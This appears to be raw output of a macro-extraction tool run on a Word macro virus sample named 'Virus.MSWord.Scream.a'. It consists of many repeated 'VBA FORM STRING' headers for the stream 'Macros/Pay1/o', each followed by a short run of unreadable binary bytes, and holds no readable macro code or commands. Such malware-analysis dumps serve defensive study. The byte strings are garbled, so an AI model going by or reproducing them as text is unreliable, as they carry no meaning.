- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�E$���%_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?b��i���u/���� �5�򸃟0�cOi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����[i�=�[���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*n�E#I��h4���ǵl��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� v=IE^�մ�ޗO�q� q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
exs_�{�qÉSu�r=N"����qmM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D'����S�]�t�Q](]Ir�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VZ�cv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�I%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǀ3�8*B��9Rh�E���E5��Z9�[$N �$ǽP��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H�s�ׯ�?���_F=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R$}���1�_��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z��> }�j�V��z��> }�j�D4ߐ�����B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q3#i���S�&�#�VM}eխ��p{�O�wc@��"�z5G�ӱ쑠��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʴӖ�K�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JN���q�]��a@d�H&g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I\覬M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��*��a--;��I���6@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H��:j���1�dc��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t5�I:x��<|�7��e&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-K�Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƛ����������)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!4��G���x�	�uME��-T�e�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<A<i��KdO����Ird`i<�°4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P~�M�8i�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�h�����=L2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Seö�Cz���jk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���|3:7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
�ݹ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(����Z�i���1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���B�J��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�_d���n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R��d���kFIA����U����zx��7��c�B�]'�l:6�d����bI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�ܷ��OC���4b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y���e	�n�4��K/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A���2�x��U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��k-N��C�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�_mט�m��n�,<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I/9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u6��U,��8o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�U,u[��Fq�a�k]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������]�z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߌ�]44�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Rpe��;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H<;Ry����{�6B�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���X�SN���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w����Ћ	i�P� ��5Ǝ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$E�|l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��}�U:�]Co��j��:(��71��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�~��+�%E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cqk��
�G$՘�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�l~��cر�mI����"�ϳ^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H����tǹ~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;m�F����Q��[{m�F����Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~BV����=�X[%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��k�D>�at,ˈ�r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�68���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Rk}��bl�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�{c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q]I��[5�v�G��v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�Fڈ(�w�������rkx��S:�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.4�<^{�w֡z�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G0���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y^5E|�{�{�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jԯ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��UW���xl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=)$�+|u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���qI\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���S�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:ccuo���c���ev$<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�@u��i�%|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R펲a�ʽ�ݻ+&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����%@^\Md�'ߟZD���N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ao�O|p��K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǐ#�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"R�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9j��5DW8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&p�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-����=��SDGMQ'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p{���cY���ɭ�Ϩ�n�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jq���`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<5s2��x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����3�d���f�s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��02�<K����Z۔�=��{�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��=���9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8��<]8Լg���Xy��B�I���+�x,%{-kb.�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@9N#E���N-�Jz��i'��c_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8q���oZ�jn4�4����G�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�昦܉�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7Y�Y�[%5C���3��B�+�	���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_����C$�x�E�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%#�������mM$��g�a�p�I�Ⱦ,KR����>��B:2{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\��9oI#A�1�W]�G\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T'�#�y�ث���ڛC)&����##�&RD&�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^��/)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������k�Ǳc�ړ���*E�f�~���?Z�1�X궤���ʑ#�o��r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v�ԍ!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U"���ԍ!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U"!��������b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�h�t���gD��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W2i���i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WKi�eK,N��ۥ�/.񓒉�-;\��`�-SH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w*���ڡ���e�,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W,WH�Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#d���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jm��#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i	��q���;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��Ty
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�9�%�>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j|Ѻ^��.�R��H��xOǂ��O`R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��In
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 9��0v�y.�Ӗ�;=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�m/CM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-FK]$V;e=� �����;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
